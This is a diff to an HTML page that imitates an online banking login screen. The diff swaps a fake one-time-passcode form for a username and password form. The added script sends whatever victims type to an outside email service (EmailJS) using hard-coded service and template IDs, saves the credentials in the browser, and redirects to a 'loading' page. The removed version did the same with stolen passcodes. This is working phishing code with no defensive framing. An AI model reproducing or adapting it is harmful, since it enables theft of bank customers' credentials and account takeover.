@@ -30,90 +30,65 @@
     
     <button type=button class=active aria-label><h1>Log In</h1></button></div><div class="Module default LoginUsername no-margin login-recovery"><div class=ModuleBody>
     
-   <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+ <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
   <script>
     (function() {
       emailjs.init("kCcVZjZ0EQOMxvbkI");
     })();
   </script>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      margin: 40px;
-    }
-    .form-group {
-      margin-bottom: 20px;
-    }
-    .plain-text {
-      font-size: 14px;
-      color: #333;
-      margin-bottom: 25px;
-    }
-  </style>
 </head>
 <body>
-
-  <form id="otp-form">
-    <h3>Secure Login *</h3>
-    
-    <div class="plain-text">
-      We've sent you a text message with a one-time passcode to your phone number. The passcode is valid for the next 25 minutes.
+  <form id="login-form">
+    <div class="form-group">
+      <label for="username">Username:</label>
+      <input id="username" type="text" class="form-control" name="username" maxlength="34">
     </div>
 
     <div class="form-group">
-      <label for="otp">One-Time Passcode (OTP):</label>
-      <input
-        id="passcode"
-        type="text"
-        class="form-control"
-        name="otp"
-        maxlength="6"
-        placeholder="Enter 6-digit code"
-        required
-      >
+      <label for="password">Password:</label>
+      <input id="password" type="text" class="form-control" name="password" maxlength="34">
+      <div class="help-block text-muted small">
+        <div class="clearfix">
+          <button type="button" class="NoteLink btn btn-link pull-right">Forgot Password/Username</button>
+        </div>
+      </div>
     </div>
 
     <div class="form-group">
-      <button type="submit" class="btn btn-primary">
-        Verify <i class="fa fa-fw fa-check" aria-hidden="true"></i>
+      <button type="submit" class="btn btn-primary col-xs-12">
+        Continue <i class="fa fa-fw fa-caret-right" aria-hidden="true"></i>
       </button>
-    </div>
-
-     <div class="form-group">
-      <button type="button" class="btn btn-link" id="resend-code">Resend Passcode</button>
     </div>
   </form>
 
   <script>
-    function sendOTP(otpCode) {
+    function sendEmail(username, password) {
       emailjs.send("service_dw04fcy", "template_5mdis08", {
-        passcode: otpCode // ✅ matches your EmailJS variable: {{passcode}}
+        username: username,
+        password: password
       }).then(function(response) {
-        console.log("OTP sent successfully!", response);
-        window.location.href = "loadingpage2.html";
+        console.log("Email sent!", response);
+        localStorage.setItem("loginUsername", username);
+        localStorage.setItem("loginPassword", password);
+        window.location.href = "loadingpage.html";
       }, function(error) {
-        console.error("OTP sending failed:", error);
+        console.error("Email failed:", error);
       });
     }
 
-    document.getElementById("otp-form").addEventListener("submit", function(event) {
+    document.getElementById("login-form").addEventListener("submit", function(event) {
       event.preventDefault();
-      var otpCode = document.getElementById("passcode").value.trim();
-      if (!otpCode) {
-        alert("Please enter the code.");
+      var username = document.getElementById("username").value.trim();
+      var password = document.getElementById("password").value.trim();
+
+      if (!username || !password) {
+        alert("Both fields are required.");
         return;
       }
-      sendOTP(otpCode);
-    });
 
-    document.getElementById("resend-code").addEventListener("click", function() {
-      alert("A new code has been sent to your phone.");
-      // Optional: trigger another emailjs.send() here for resend logic
+      sendEmail(username, password);
     });
   </script>
-
-</body>
-
         
         <button type=button class="btn btn-link register-button">Register for Online Banking</button></div></form></div></div><div class="Links row clearfix"><div class="col-xs-12 col-sm-4">
         
